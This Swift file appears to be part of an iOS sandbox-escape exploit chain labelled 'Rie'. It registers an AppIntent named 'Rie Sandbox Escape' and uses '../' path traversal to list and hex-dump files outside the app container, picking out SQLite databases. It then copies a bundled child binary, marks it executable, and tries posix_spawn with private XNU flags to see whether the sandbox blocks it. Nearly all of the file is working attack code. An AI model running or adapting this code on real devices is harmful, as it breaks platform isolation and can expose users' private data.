import Foundation
import AppIntents

// MARK: - XNU private spawn flags

private let POSIX_SPAWN_START_SUSPENDED: Int16 = 0x0080
private let POSIX_SPAWN_RESLIDE: Int16          = 0x0800

// MARK: - AppIntent

@available(iOS 16.0, *)
public struct SwordRieIntent: AppIntent {
    public static var title: LocalizedStringResource = "Rie Sandbox Escape"
    public static var description: IntentDescription = IntentDescription(
        "Test posix_spawn in AppIntents context for Rie exploit chain"
    )

    public init() {}

    @MainActor
    public func perform() async throws -> some IntentResult {
        let bridge = SwordAppIntentBridge()
        var log = "[SwordRieIntent perform()]\nAppIntents context active — testing posix_spawn...\n"
        log += bridge.testPosixSpawnContext()
        print(log)
        return .result()
    }
}

// MARK: - Async Runner (bridges perform() to ObjC callback)

@objc public class SwordAppIntentRunner: NSObject {
    @objc public func invokeIntent(_ callback: @escaping (String) -> Void) {
        Task { @MainActor in
            let intent = SwordRieIntent()
            // perform() prints to stdout; also capture the IntentResult
            _ = try? await intent.perform()
            // Signal completion — actual log is in stdout/console
            callback("AppIntent perform() completed — check device syslog for output")
        }
    }
}

// MARK: - ObjC Bridge

@objc public class SwordAppIntentBridge: NSObject {

    // MARK: existing API (unchanged)

    @objc public func enumerateDirectory(_ dirPath: String) -> String {
        let fm = FileManager.default
        let base = "../../../../../../../../../../../../../"
        let fullPath = (base + dirPath as NSString).expandingTildeInPath

        var result = "[Swift Bridge]\n"
        result += "target: \(fullPath)\n"

        var isDir: ObjCBool = false
        let exists = fm.fileExists(atPath: fullPath, isDirectory: &isDir)
        result += "exists: \(exists), isDir: \(isDir.boolValue)\n"

        if exists && isDir.boolValue {
            if let contents = try? fm.contentsOfDirectory(atPath: fullPath) {
                result += "contentsOfDir: \(contents.count) entries\n"
                for entry in contents.prefix(200) {
                    result += "  \(entry)\n"
                }
            } else {
                result += "contentsOfDir: FAILED\n"
            }
        } else if exists {
            if let data = try? Data(contentsOf: URL(fileURLWithPath: fullPath)) {
                result += "file size: \(data.count) bytes\n"
                let hex = data.prefix(64).map { String(format: "%02x", $0) }.joined(separator: " ")
                result += "hex (first 64): \(hex)\n"
                if data.count >= 16 && data.prefix(16) == Data("SQLite format 3".utf8) {
                    result += "type: SQLite3\n"
                }
            }
        } else {
            result += "NOT FOUND\n"
        }
        return result
    }

    @objc public func probePath(_ relPath: String) -> String {
        let base = "../../../../../../../../../../../../../"
        let fullPath = (base + relPath as NSString).expandingTildeInPath
        let fm = FileManager.default
        var isDir: ObjCBool = false
        let exists = fm.fileExists(atPath: fullPath, isDirectory: &isDir)
        if exists {
            let attrs = try? fm.attributesOfItem(atPath: fullPath)
            let sz = attrs?[.size] as? UInt64 ?? 0
            return "[+] \(relPath) (\(sz) bytes)\(isDir.boolValue ? " [DIR]" : "")"
        }
        return "[-] \(relPath)"
    }

    // MARK: posix_spawn test (new — called from AppIntent perform())

    @objc public func testPosixSpawnContext() -> String {
        var log = "[posix_spawn in AppIntents context]\n"

        // Locate rie_child in bundle
        guard let childPath = Bundle.main.path(forResource: "rie_child", ofType: nil) else {
            log += "!! rie_child not in bundle\n"
            return log
        }

        // Copy to app tmp dir (sandbox-safe)
        let tmpChild = (NSTemporaryDirectory() as NSString).appendingPathComponent("rie_child")
        let fm = FileManager.default
        try? fm.removeItem(atPath: tmpChild)

        do {
            try fm.copyItem(atPath: childPath, toPath: tmpChild)
        } catch {
            log += "!! copy child failed: \(error.localizedDescription)\n"
            return log
        }
        tmpChild.withCString { Darwin.chmod($0, 0o755) }

        let labels = ["RESLIDE", "START_SUSPENDED", "plain (flags=0)"]
        let flagsList: [Int16] = [
            POSIX_SPAWN_START_SUSPENDED | POSIX_SPAWN_RESLIDE,
            POSIX_SPAWN_START_SUSPENDED,
            0,
        ]

        var pid: pid_t = 0

        for i in 0..<3 {
            let flags = flagsList[i]
            var attr: posix_spawnattr_t?
            posix_spawnattr_init(&attr)
            posix_spawnattr_setflags(&attr, flags)

            let rc = tmpChild.withCString { pathPtr -> Int32 in
                var argv: [UnsafeMutablePointer<CChar>?] = [
                    UnsafeMutablePointer(mutating: pathPtr),
                    nil,
                ]
                return argv.withUnsafeMutableBufferPointer { buf in
                    posix_spawn(&pid, pathPtr, nil, &attr, buf.baseAddress, nil)
                }
            }

            posix_spawnattr_destroy(&attr)

            if rc == 0 {
                log += "  \(labels[i])(0x\(String(flags, radix: 16))): SUCCESS pid=\(pid)\n"
                kill(pid, SIGKILL)
                var st: Int32 = 0
                waitpid(pid, &st, 0)
                log += "*** POSIX_SPAWN WORKS IN APPINTENTS CONTEXT ***\n"
                return log
            } else {
                let errStr: String
                switch rc {
                case 1:  errStr = "EPERM"
                case 22: errStr = "EINVAL"
                case 78: errStr = "ENOEXEC"
                default: errStr = "\(rc)"
                }
                log += "  \(labels[i])(0x\(String(flags, radix: 16))): FAIL \(errStr)\n"
            }
        }

        log += "all attempts failed — posix_spawn still blocked\n"
        return log
    }
}
